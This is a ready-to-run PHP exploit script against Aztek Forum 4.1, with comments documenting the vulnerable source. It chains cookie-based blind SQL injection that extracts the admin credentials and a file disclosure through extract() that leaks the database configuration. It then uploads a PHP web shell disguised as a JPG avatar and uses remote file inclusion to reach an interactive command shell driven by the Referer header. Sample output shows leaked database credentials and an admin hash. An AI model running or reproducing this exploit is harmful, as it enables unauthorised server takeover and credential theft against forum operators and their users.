#!/usr/bin/php
<?php

/**
 * This file require the PhpSploit class.
 * If you want to use this class, the latest
 * version can be downloaded from acid-root.new.fr.
 **/
require("phpsploitclass.php"); # >= 1.2
error_reporting(E_ALL ^ E_NOTICE);

/*
 header> Aztek Forum 4.1 Multiple Vulnerabilities Exploit
 header> ===================================================
 sploit> Owner -> root
 status> Trying to register a new user
 sploit> Login/Password -> phpsploit8435
 status> Trying to get databases informations
 sploit> Full Path Disclosure -> /home/www/aztekforum/forum/load.php
 sploit> Done (./avatar/phpsploit8435.jpg)
 sploit> $dbhost -> localhost
 sploit> $usebdd -> aztek
 sploit> $user -> root
 sploit> $password -> toor
 sploit> $salt -> atk
 status> Trying to get the administrator login/passwd
 sploit> Username length 7
 sploit> Username -> darkfig
 sploit> Password length 13
 sploit> Password -> atovlv6iH1rUo
 sploit> Salt -> atk (Standard DES hash)
 sploit> Enter the decrypted password for continue: hello
 status> Uploading a malicious picture
 status> Trying to get logged in
 sploit> Done
 status> Creating a hidden forum
 sploit> Done
 status> Trying to include the picture
 $shell> whoami
 DarkFig

 $shell> exit
*/
if($argc < 2)
{
        print "\n---------------------------------------------------------";
        print "\nAffected.scr..: Aztek Forum V4.1";
        print "\nPoc.ID........: 21070125";
        print "\nType..........: Multiple vulnerability";
        print "\nConditions....: None =)";
        print "\nRisk.level....: High";
        print "\nSrc.download..: www.forum-aztek.com";
        print "\nPoc.link......: acid-root.new.fr/poc/21070125.txt";
        print "\nCredits.......: DarkFig";
        print "\n---------------------------------------------------------";
        print "\nUsage.........: php xpl.php <url> <proxyoptions>";
        print "\nProxyOptions..: <proxhost:proxport> <proxuser:proxpass>";
        print "\nExample.......: php xpl.php http://victim.com/";
        print "\n---------------------------------------------------------";
        exit(1);
}

/*

 ---[ CODE ./common/config.php
 -----------------------------
 @extract($_POST);          // Variables en POST
 @extract($_GET);               // Variables en GET
 @extract($_COOKIE);    // Variable des cookies
 @extract($_SERVER);    // Variable Server
 -----------------------------
 |
 +-> All variables initialized before the inclusion can be overwritten.


 ---[ CODE ./common/safety.php
 -----------------------------
 $BANNED_STRING[] = "%22";
 $BANNED_STRING[] = "%23";
 $BANNED_STRING[] = "%47";
 ...
 foreach($_GET as $key=>$value) ...
 $_POST[$key] = str_replace($BANNED_STRING[$i], "", $_POST[$key]);
 $$key = $_POST[$key];
 ...
 foreach($_POST as $key=>$value) ...
 $_GET[$key] = str_replace($BANNED_STRING[$i], "", $_GET[$key]);
 $$key = $_GET[$key];
 -----------------------------
 |
 +-> Filter can be bypassed with extract($_COOKIE)


 ---[ CODE ./forum/load.php
 --------------------------
 if(!empty($fid)) $FORUM=$fid;
 ...
 $sql=dbquery("SELECT * FROM atk_forums WHERE id=$FORUM",33,29);
 $PF=mysql_fetch_array($sql);
 --------------------------
 |
 +-> Blind SQL Injection without quote


 ---[ CODE ./index/main.php
 --------------------------
 if($PF["top_url"]) @include($PF["top_url"]);
 --------------------------
 |
 +-> Remote File Inclusion (admin rights needed in order to insert "top_url" in "atk_forums")


 ---[ CODE ./index/common_actions.php
 ------------------------------------
 $file = $_FILES['upload']['tmp_name']; ...
 if(@copy($file,$path_file)) $avatar=$path_file;
 ------------------------------------
 |
 +-> $_FILES can be overwritten (with extract()), this can lead to file disclosure =).

 */
$url=$argv[1];$prs=$argv[2];
$pra=$argv[3];

$xpl = new phpsploit();
if(!empty($prs)) $xpl->proxy($prs);
if(!empty($pra)) $xpl->proxyauth($pra);

print "\nheader> Aztek Forum 4.1 Multiple Vulnerabilities Exploit";
print "\nheader> ===================================================";

if(preg_match("#href='\./index\.php\?owner=(\S*)'#i",$xpl->getcontent($xpl->get($url.'forum.php?fid=-1%20or%201=1')),$matches)) print "\nsploit> Owner ->
".$matches[1];
else die("\nsploit> Exploit failed");
$owner = $matches[1];

print "\nstatus> Trying to register a new user";
$xpl->cookiejar(1);
$xpl->allowredirection(1);
$name = "phpsploit".rand();
$xpl->post($url."index.php?owner=$owner&action=subscribe","login=$name&passwd=$name&passwd2=$name&email=$name%40hotmail.coum&show_email=on&cookie=on");
print "\nsploit> Login/Password -> $name";

print "\nstatus> Trying to get databases informations";
$xpl->get($url."forum.php?fid=XD");
if(preg_match("#file (.*) in function#i",$xpl->getcontent(),$matches)) print "\nsploit> Full Path Disclosure -> ".$matches[1];
else print("\nsploit> Failed");
$wanted = str_replace("forum/load.php","common/bddconf.php",$matches[1]);

if(!empty($wanted)){
$xpl->get($url."index.php?owner=$owner&action=profile&_SERVER[email]=$name%40hotmail.coum&_FILES[upload][tmp_name]=$wanted&_FILES[upload][name]=0123456789&_FILES[uplo
ad][type]=jpg");
$xpl->get($url."index.php?owner=$owner&choix=3");
if(preg_match("#<IMG src='(.*)' width='([0-9]*)' height='([0-9]*)'>#i",$xpl->getcontent(),$matches)) print "\nsploit> Done (".$matches[1].")";
else print("\nsploit> Failed");
$avatarur = $matches[1];
if(!empty($matches[1])){
$xpl->get($url.str_replace("./","/",$matches[1]));
preg_match_all("#(.*)='(.*)';#",$xpl->getcontent(),$vars);
for($z=0;$z<=4;$z++){
print "\nsploit> ".strtolower($vars[1][$z])." -> ".$vars[2][$z];
}}}

print "\nstatus> Trying to get the administrator login/passwd";
$headers = array("Username","Password");
$fields  = array("login","passwd");
$value=$length=array();
$value=$length=array();

for($a=0;$a<2;$a++){

print "\nsploit> ".$headers[$a]." length ";
for($b=1;$b<3;$b++){
for($c=48;$c<=57;$c++){
$xpl->addcookie("fid","-1%20OR%20SUBSTR(LENGTH((SELECT%20".$fields[$a]."%20FROM%20atk_users%20WHERE%20(admin)%20LIMIT%201)),$b,1)=CHAR($c)");
if(!preg_match("#<TITLE></TITLE>#i",$xpl->getcontent($xpl->get($url."forum.php")))) {
   $length[$a] .= chr($c);
   print chr($c);
   break;
}}}

print "\nsploit> ".$headers[$a]." -> ";
for($d=1;$d<=$length[$a];$d++){
for($e=0;$e<=128;$e++){
$xpl->addcookie("fid","-1%20OR%20HEX(SUBSTR((SELECT%20".$fields[$a]."%20FROM%20atk_users%20WHERE%20(admin)%20LIMIT%201),$d,1))=HEX(CHAR($e))");
if(!preg_match("#<TITLE></TITLE>#i",$xpl->getcontent($xpl->get($url."forum.php")))) {
   $value[$a] .= chr($e);
   print chr($e);
   break;
}}}}

$salt = !empty($vars[2][4]) ? $vars[2][4] : 'atk'; # Always the same salt ...
print "\nsploit> Salt -> $salt (Standard DES hash)";
print "\nsploit> Enter the decrypted password for continue: ";
$password = trim(fgets(STDIN));
$xpl->addcookie("fid","-1 or 1=1");
$xpl->cookiejar(1);

print "status> Uploading a malicious picture";
$formdata = array(frmdt_url => $url."?owner=$owner&action=profile",
                  "email"   => "$name@hotmail.coum",
                  "url"     => "http://",
                  "upload"  => array(frmdt_type     => "image/jpg",
                                     frmdt_filename => "hello.jpg",
                                     frmdt_content  => "<?php print 337666733;@extract(\$_SERVER);@system(\$HTTP_REFERER);print 337666733;exit(0); ?>"),
                  "avatar"  => "./avatar/welcome.jpg");
$xpl->formdata($formdata);

print "\nstatus> Trying to get logged in";
$xpl->post($url.'myadmin.php?action=login','login='.$value[0].'&passwd='.$password);
if(preg_match("#ATK_ADMIN#i",$xpl->showcookie())) print "\nsploit> Done";
else die("\nsploit> Exploit failed");
print "\nstatus> Creating a hidden forum";
$xpl->get($url.'myadmin.php?choix=2');
if(!preg_match("#<option value='(\S+)'#",$xpl->getcontent(),$styles)) $styles[1] = "xml_BlueLight";
$xpl->post($url.'myadmin.php?action=create',"title=$name&filename=$name&passwd=&style=".$styles[1]."&structure=1&subject=");
$xpl->get($url.'myadmin.php?choix=1');
if(!preg_match_all("#action=hide_forum&id=([0-9]+)#",$xpl->getcontent(),$fid)) die("\nsploit> Can't retrieve the forum id");
$forumid = $fid[1][(count($fid[1])-1)];
$xpl->get($url."myadmin.php?choix=1&action=hide_forum&id=$forumid");

print "\nsploit> Done\nstatus> Trying to include the picture\n\$shell> ";
if(empty($avatarur)) $avatarur="./avatar/$name.jpg";
$xpl->post($url."myadmin.php?action=rec_perso&id=$forumid&choix=3","PARAM%5Btop_url%5D=$avatarur");
$xpl->reset();

while(!preg_match("#^(quit|exit)$#",($cmd = trim(fgets(STDIN)))))
{
    $xpl->addheader("Referer",$cmd);
    $xpl->get($url.$name.'.php');
    $data = explode("337666733",$xpl->getcontent());
    print $data[1]."\n\$shell> ";
}

?>
